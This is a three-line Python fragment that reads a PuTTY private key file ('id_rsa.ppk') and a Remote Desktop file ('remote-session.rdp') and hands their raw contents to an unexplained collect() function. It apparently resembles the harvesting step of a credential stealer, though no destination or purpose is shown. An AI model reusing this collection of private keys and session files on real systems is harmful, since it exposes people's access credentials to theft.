for path in ("id_rsa.ppk", "remote-session.rdp"):
    with open(path, "rb") as source:
        collect(source.read())
